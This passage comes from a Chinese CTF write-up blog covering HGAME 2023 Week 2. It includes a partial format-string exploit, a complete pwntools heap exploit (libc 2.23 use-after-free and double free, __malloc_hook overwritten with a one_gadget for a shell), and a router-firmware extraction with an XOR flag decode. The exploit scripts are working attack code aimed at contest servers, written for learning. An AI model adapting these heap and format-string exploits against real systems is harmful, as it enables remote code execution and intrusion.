libc.sym.__libc_start_main</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="comment">#r.recvline()</span></span><br><span class="line"></span><br><span class="line">ogg = libc_base+<span class="number">0xe3b01</span></span><br><span class="line">r.recvline()</span><br><span class="line">pl = p64(stack_addr-<span class="number">224</span>+<span class="number">2</span>)+p64(stack_addr-<span class="number">224</span>)</span><br><span class="line">r.send(pl)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.sendline(<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pl = <span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((ogg&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span>)+<span class="string">&#x27;c%8$hhn&#x27;</span>+<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((ogg&amp;<span class="number">0xffff</span>)-((ogg&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span>))+<span class="string">&#x27;c%9$hn&#x27;</span></span><br><span class="line">r.send(pl)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="fast-note"><a href="#fast-note" class="headerlink" title="fast_note"></a>fast_note</h3><p>libc 2.23 UAFï¼Œæ³„éœ² <code>__malloc_hook()</code> åœ°å€æ±‚å¾—libcåŸºåœ°å€ï¼Œdouble freeåä½¿ç”¨ <code>realloc()</code> è°ƒè¯•ï¼Œä½¿å¾—æ»¡è¶³one_gadgetæ¡ä»¶å³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;week-2.hgame.lwsec.cn&#x27;</span>,<span class="number">31341</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">ind,size,content</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(ind))</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Size: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    r.sendafter(<span class="string">&#x27;Content: &#x27;</span>,content)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">ind</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(ind))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">ind</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(ind))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x80</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">malloc_hook = u64(r.recv(<span class="number">6</span>)+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">2</span>)-<span class="number">104</span></span><br><span class="line">libc_base = malloc_hook - libc.sym.__malloc_hook</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x60</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x60</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x60</span>,<span class="string">&#x27;e&#x27;</span>*<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x60</span>,p64(malloc_hook-<span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x60</span>,<span class="string">&#x27;f&#x27;</span>*<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x60</span>,<span class="string">&#x27;f&#x27;</span>*<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">ogg = libc_base + <span class="number">0xf1247</span></span><br><span class="line">realloc = libc_base + libc.sym.realloc</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(realloc))</span><br><span class="line"></span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x60</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0xb</span>+p64(ogg)+p64(realloc+<span class="number">0x6</span>))</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>,<span class="string">&#x27;10&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;Size: &#x27;</span>,<span class="string">&#x27;20&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>â€‹</p><h2 id="Iot"><a href="#Iot" class="headerlink" title="Iot"></a>Iot</h2><h3 id="Pirated-router"><a href="#Pirated-router" class="headerlink" title="Pirated router"></a>Pirated router</h3><blockquote><p>å…”å…”åœ¨å›å®¶çš„ç«è½¦ä¸Š,çœ‹åˆ°ä¸€ä¸ªç¥ç§˜çš„0tatoPåœ¨å–è·¯ç”±å™¨,äºæ˜¯å…”å…”ä¹°äº†ä¸€ä¸ªå›å®¶è¿‡å¹´,ä½†æ˜¯è¿™ä¸ªè·¯ç”±å™¨å’‹æ€»æ„Ÿè§‰æ€ªæ€ªçš„</p></blockquote><p>è·¯ç”±å™¨binå›ºä»¶æ–‡ä»¶ï¼Œå‚è€ƒ<a target="_blank" rel="noopener" href="https://iqqoz.com/post-3231.html#gsc.tab=0">æå–è·¯ç”±å™¨å›ºä»¶ä¸­çš„squashfsæ–‡ä»¶ç³»ç»Ÿunsquashfsæå–æ–¹æ³•</a>ï¼Œæå–è·¯ç”±å™¨å›ºä»¶ä¸­çš„squashfsã€‚</p><p>å®‰è£…squashfsåï¼Œä½¿ç”¨binwalkåˆ†ç¦»binæ–‡ä»¶ï¼š<code>binwalk -e AC10086W_FW_1.1.4.5.bin</code>ï¼Œç”Ÿæˆæ–‡ä»¶å¤¹ <code>squashfs-root</code>ï¼Œå…¶ä¸­çš„squashfsæ–‡ä»¶ï¼Œä¿®æ”¹æ–‡ä»¶å¤´ä¸º <code>hsqs</code>ã€‚</p><p>åˆ©ç”¨ <a target="_blank" rel="noopener" href="https://github.com/rampageX/firmware-mod-kit.git">firmware-mod-kit</a> è§£åŒ…squashfsæ–‡ä»¶ï¼š<code>unsquashfs 1.squashfs</code>ï¼Œåœ¨ <code>/bin</code> ç›®å½•ä¸­å‘ç°ä¸€ä¸ªæ–‡ä»¶åæ¯”è¾ƒç‰¹åˆ«çš„ç¨‹åº <code>secret_program</code>ï¼Œä½¿ç”¨IDAæŸ¥çœ‹é€»è¾‘ï¼Œ<code>main()</code> å‡½æ•°ä¸­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _OWORD v4[<span class="number">8</span>]; <span class="comment">// [xsp+10h] [xbp+10h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [xsp+90h] [xbp+90h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [xsp+98h] [xbp+98h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [xsp+9Ch] [xbp+9Ch]</span></span><br><span class="line"></span><br><span class="line">  v4[<span class="number">0</span>] = unk_4543B0;</span><br><span class="line">  v4[<span class="number">1</span>] = unk_4543C0;</span><br><span class="line">  v4[<span class="number">2</span>] = unk_4543D0;</span><br><span class="line">  v4[<span class="number">3</span>] = unk_4543E0;</span><br><span class="line">  v4[<span class="number">4</span>] = unk_4543F0;</span><br><span class="line">  v4[<span class="number">5</span>] = unk_454400;</span><br><span class="line">  v4[<span class="number">6</span>] = unk_454410;</span><br><span class="line">  v4[<span class="number">7</span>] = unk_454420;</span><br><span class="line">  v5 = <span class="number">94</span>;</span><br><span class="line">  v6 = <span class="number">35</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">32</span>; ++i )</span><br><span class="line">    <span class="built_in">printf</span>(&amp;unk_4543A8, *((_DWORD *)v4 + i) ^ v6);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æå–æ•°æ®ï¼Œç®€å•å¼‚æˆ–æ“ä½œè¿˜åŸï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s = [<span class="number">75</span>, <span class="number">68</span>, <span class="number">66</span>, <span class="number">78</span>, <span class="number">70</span>, <span class="number">88</span>, <span class="number">86</span>, <span class="number">77</span>, <span class="number">83</span>, <span class="number">23</span>, <span class="number">64</span>, <span class="number">72</span>, <span class="number">18</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">124</span>, <span class="number">69</span>, <span class="number">74</span>, <span class="number">81</span>, <span class="number">78</span>, <span class="number">84</span>, <span class="number">66</span>, <span class="number">81</span>, <span class="number">70</span>, <span class="number">124</span>, <span class="number">18</span>, <span class="number">80</span>, <span class="number">124</span>, <span class="number">16</span>, <span class="number">98</span>, <span class="number">80</span>, <span class="number">90</span>, <span class="number">94</span>]</span><br><span class="line">ss = [k^<span class="number">35</span> <span class="keyword">for</span> k <span class="keyword">in</span> s]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(ss))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;hgame&#123;unp4ck1ng_firmware_1s_3Asy&#125;&#x27;</span></span><br></pre></td></tr></table></figure></div><div class="article-footer"></div></article><section id="comments"><div id="vcomments"></div></section></div><nav class="bar bar-footer clearfix" data-stick-bottom><div class="bar-inner"><ul class="pager pull-left"><li class="prev"><a href="/2023/01/30/match-HGAME-2023-Week-3/" title="HGAME 2023 Week 3"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;ä¸Šä¸€ç¯‡</span></a></li><li class="next"><a href="/2023/01/11/match-HGAME-2023-Week-1/" title="HGAME 2023 Week 1"><span>ä¸‹ä¸€ç¯‡&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a></li><li class="toggle-toc"><a class="toggle-btn collapsed" data-toggle="collapse" href="#collapseToc" aria-expanded="false" title="æ–‡ç« ç›®å½•" role="button"><span>[&nbsp;</span><span>æ–‡ç« ç›®å½•</span> <i class="text-collapsed icon icon-anchor"></i> <i class="text-in icon icon-close"></i> <span>]</span></a></li></ul><button type="button" class="btn btn-fancy btn-donate pop-onhover bg-gradient-warning" data-toggle="modal" data-target="#donateModal"><span>èµ</span></button><div class="bar-right"><div class="share-component" data-sites="weibo,qq,wechat" data-mobile-sites="weibo,qq,wechat"></div></div></div></nav><div class="modal modal-center modal-small modal-xs-full fade" id="donateModal" tabindex="-1" role="dialog"><div class="modal-dialog" role="document"><div class="modal-content donate"><button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button><div class="modal-body"><div class="donate-box"><div class="donate-head"><p>è¿™ç¯‡æ–‡ç« å¯¹ä½ æœ‰ç”¨ï¼Œèµä¸€æ¯å’–å•¡â˜•~~</p></div><div class="tab-content"><div role="tabpanel" class="tab-pane fade active in" id="wechatpay"><div class="donate-payimg"><img src="/images/donate/wechatpayimg.png" alt="æ‰«ç æ”¯æŒ" title="æ‰«ä¸€æ‰«"></div><p class="text-muted mv">âLazzaroâ </p><p class="text-grey">æ‰“å¼€å¾®ä¿¡æ‰«ä¸€æ‰«å³å¯æ‰«ç æ‰“èµä»–ä¸€æ³¢å“¦~</p></div><div role="tabpanel" class="tab-pane fade" id="alipay"><div class="donate-payimg"><img src="/images/donate/alipayimg.png" alt="æ‰«ç æ”¯æŒ" title="æ‰«ä¸€æ‰«"></div><p class="text-muted mv">âLazzaroâ </p><p class="text-grey">æ‰“å¼€æ”¯ä»˜å®æ‰«ä¸€æ‰«å³å¯æ‰«ç æ‰“èµä»–ä¸€æ³¢å“¦~</p></div></div><div class="donate-footer"><ul class="nav nav-tabs nav-justified" role="tablist"><li role="presentation" class="active"><a href="#wechatpay" role="tab" id="wechatpay-tab" data-toggle="tab" aria-controls="wechatpay" aria-expanded="true"><i class="icon icon-wepay"></i> å¾®ä¿¡æ”¯ä»˜</a></li><li role="presentation"><a href="#alipay" id="alipay-tab" role="tab" data-toggle="tab" aria-controls="alipay" aria-expanded="false"><i class="icon icon-alipay"></i> æ”¯ä»˜å®</a></li></ul></div></div></div></div></div></div></main><footer class="footer" itemscope itemtype="http://schema.org/WPFooter"><ul class="social-links"><li><a href="https://github.com/Lazzzaro" target="_blank" title="Github" data-toggle="tooltip" data-placement="top"><i class="icon icon-github"></i></a></li></ul><div class="copyright">&copy; 2023 Lazzaro<br><span>æ€»è®¿é—® - <span id="busuanzi_value_site_pv"></span>æ¬¡</span><br><span>è®¿å®¢æ•° - <span id="busuanzi_value_site_uv"></span>äºº</span><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></footer><script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script><script>window.jQuery||document.write('<script src="js/jquery.min.js"><\/script>')</script><script src="/js/plugin.min.js"></script><script src="/js/application.js"></script><script>window.INSIGHT_CONFIG={TRANSLATION:{POSTS:"æ–‡ç« ",PAGES:"é¡µé¢",CATEGORIES:"ç±»åˆ«",TAGS:"å…³é”®è¯",UNTITLED:"(æœªå‘½å)"},ROOT_URL:"/",CONTENT_URL:"/content.json"}</script><script src="/js/insight.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="//cdn.jsdelivr.net/npm/valine"></script><script type="text/javascript">var GUEST=["nick","mail","link"],meta=(meta="nick,mail,link").split(",").filter(function(e){return-1<GUEST.indexOf(e)});new Valine({el:"#vcomments",verify:!1,notify:!1,appId:"sK4BUsDgfSB843HYgJyTcV7P-gzGzoHsz",appKey:"NKNx8m2CtFeDofr8LNLX7aNG",placeholder:"æ¥æ¥æ¥è¯´ç‚¹å•¥~~\r\nå¯¹ä½ æœ‰ç”¨ï¼Ÿèµä¸€æ³¢ï¼â†˜â†˜",avatar:"mp",meta:meta,pageSize:"10",visitor:!0})</script><script defer type="text/javascript">!function(e,a,t,n,g,c){e.GoogleAnalyticsObject=n,e.ga=e.ga||function(){(e.ga.q=e.ga.q||[]).push(arguments)},e.ga.l=+new Date,g=a.createElement(t),c=a.getElementsByTagName(t)[0],g.async=1,g.src="//www.google-analytics.com/analytics.js",c.parentNode.insertBefore(g,c)}(window,document,"script","ga"),ga("create","UA-165804489-1","auto"),ga("send","pageview")</script><script defer>var _hmt=_hmt||[];!function(){var e=document.createElement("script");e.src="//hm.baidu.com/hm.js?e7553a1c385e5487b8ef58cd5738e112";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)}()</script><style>.copy-btn{display:inline-block;padding:6px 12px;font-size:13px;font-weight:700;line-height:20px;color:#333;white-space:nowrap;vertical-align:middle;cursor:pointer;background-color:#eee;background-image:linear-gradient(#fcfcfc,#eee);border:1px solid #d5d5d5;border-radius:3px;user-select:none;outline:0}.highlight-wrap .copy-btn{transition:opacity .3s ease-in-out;opacity:0;padding:2px 6px;position:absolute;right:4px;top:8px;z-index:2}.highlight-wrap .copy-btn:focus,.highlight-wrap:hover .copy-btn{opacity:1}.highlight-wrap{position:relative}</style><script>addLoadEvent(()=>{$(".highlight").each(function(t,e){var n=$("<div>").addClass("highlight-wrap");$(e).after(n),n.append($("<button>").addClass("copy-btn").append("å¤åˆ¶").on("click",function(t){var e=$(this).parent().find(".code")[0].innerText;e+="\n/**\n* å¤åˆ¶å¹¶ä½¿ç”¨ä»£ç è¯·æ³¨æ˜å¼•ç”¨å‡ºå¤„å“¦~\n* Lazzaro @ https://lazzzaro.github.io\n*/";var n=document.createElement("textarea");document.body.appendChild(n),n.style.position="absolute",n.style.top="0px",n.style.left="0px",n.value=e,n.select(),n.focus();e=document.execCommand("copy");document.body.removeChild(n),e?$(this).text("å¤åˆ¶æˆåŠŸ"):$(this).text("å¤åˆ¶å¤±è´¥"),$(this).blur()})).on("mouseleave",function(t){var e=$(this).find(".copy-btn");setTimeout(function(){e.text("å¤åˆ¶")},300)}).append(e)})})</script></body></html>